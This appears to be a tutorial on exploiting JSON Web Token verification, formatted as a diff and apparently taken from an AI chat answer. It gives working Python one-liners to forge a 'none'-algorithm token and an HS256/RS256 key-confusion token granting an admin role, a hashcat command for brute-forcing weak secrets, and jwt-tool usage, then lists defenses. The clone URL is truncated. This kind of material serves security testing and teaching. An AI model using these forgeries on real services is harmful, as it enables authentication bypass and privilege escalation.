@@ -1,1 +1,89 @@
 
+🦹 Attack 1: The "None" Algorithm Bypass (Signature Strip)
+
+The most famous JWT vulnerability occurs when the verification backend blindly trusts the alg parameter specified in the incoming token header. If an attacker changes the algorithm to "none", a vulnerable application will strip away the signature verification check completely and accept the forged payload data as valid.
+
+Step 1: Decode a Legitimate Token to Find the Schema
+
+bash
+# Split the token by periods (.) and decode the first two sections (Header and Payload)
+echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.signature" | cut -d'.' -f2 | base64 -d
+# Output: {"user":"john","role":"user"}
+Use code with caution.
+
+Step 2: Forge a Malicious Token via Python CLI
+
+You must change the header alg to none (or variations like NONE, None) and completely strip off the final signature block (while keeping the trailing period .).
+bash
+python3 -c "
+import base64
+# 1. Craft the malicious header and payload
+header = '{\"alg\":\"none\",\"typ\":\"JWT\"}'
+payload = '{\"user\":\"john\",\"role\":\"admin\"}'
+
+# 2. Encode to Base64URL format (stripping '=' padding)
+b64_hdr = base64.urlsafe_b64encode(header.encode()).decode().rstrip('=')
+b64_pld = base64.urlsafe_b64encode(payload.encode()).decode().rstrip('=')
+
+# 3. Assemble the forged unsigned token string (note the trailing dot)
+print(f'{b64_hdr}.{b64_pld}.')
+"
+# Output: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJhZG1pbiJ9.
+Use code with caution.
+
+🔄 Attack 2: The HMAC-RSA Key Confusion Flaw (Algorithm Confusion)
+
+This vulnerability occurs when a backend expects an asymmetric signature (like RS256 using a public/private keypair) but the developer writes verification code that blindly uses a generic jwt.decode() function.
+If an attacker changes the header algorithm from RS256 to the symmetric HS256 (HMAC-SHA256), the application code will treat its local public key string as a symmetric shared secret password. If the public key is exposed or retrievable (e.g., via a public /jwks.json endpoint), the attacker can sign a forged token using that public key as the HMAC password.
+
+Forge an Algorithm Confusion Token via Python
+
+bash
+python3 -c "
+import jwt # Requires 'pip install PyJWT'
+
+# 1. The target public key used by the server (publicly accessible)
+public_key = open('server_public_key.pem', 'r').read()
+
+# 2. Forge claims and sign using symmetric HS256 with the public key text string
+forged_token = jwt.encode({'user': 'john', 'role': 'admin'}, public_key, algorithm='HS256')
+print(f'🎯 Forged Token: {forged_token}')
+"
+Use code with caution.
+
+🪓 Attack 3: High-Speed Brute-Forcing Weak HS256 Secrets
+
+When applications use a weak, hardcoded, or easily guessable symmetric passphrase for HS256 signing (e.g., "secret", "development", "jwt-token"), you can capture a single token from your web traffic and brute-force the signing password completely offline.
+The fastest terminal tool for this is hashcat.
+bash
+# Execute an offline dictionary attack against a captured JWT string using a wordlist
+hashcat -m 16500 -a 0 "eyJhbGciOiJIUzI1...signature" rockyou.txt
+Use code with caution.
+• -m 16500: Specifies the optimization module for JWT / HMAC-SHA256 tokens.
+• If a match is found, Hashcat will instantly output the plaintext password, allowing you to sign any custom payload you want.
+
+🚀 Method 4: Automated Testing Suite with jwt-tool
+
+If you are auditing an endpoint and want to sweep it for multiple header, padding, and signature issues automatically, use the dedicated command-line framework jwt-tool.
+bash
+# 1. Clone and install the tool
+git clone https://github.com
+cd jwt-tool && python3 -m pip install -r requirements.txt
+
+# 2. Interactively analyze a token and run scanning workflows
+python3 jwt-tool.py "YOUR_JWT_STRING_HERE" -M sb
+Use code with caution.
+• -M sb: Runs the automated playbook scan, testing for none algorithm bypasses, key confusion, signature injection, and null byte vulnerabilities simultaneously.
+
+🛡️ Code-Level Remediations and Defenses
+
+To eliminate token forgery vulnerabilities entirely across your microservice architectures during security reviews:
+1. Explicitly Restrict Acceptable Algorithms: Never allow the incoming token header to dictate the verification routine. Hardcode the exact algorithm expected by your specific service endpoint.
+	• Secure Python Fix: Force the engine to reject alternative modes.python
+# Explicitly whitelist only RS256; 'none' and 'HS256' will throw an immediate error
+jwt.decode(token, public_key, algorithms=['RS256'])
+Use code with caution.
+2. Sanitize the "none" Block: Ensure your JWT library wrapper is updated to a modern version that explicitly blocks the execution of unsigned or none algorithm types by default.
+3. Utilize Cryptographically Secure Secrets: For symmetric HS256 deployments, never use human-readable strings. Generate a unique, high-entropy random sequence from your terminal to use as the environment configuration key variable:bash
+openssl rand -base64 42
+Use code with caution.
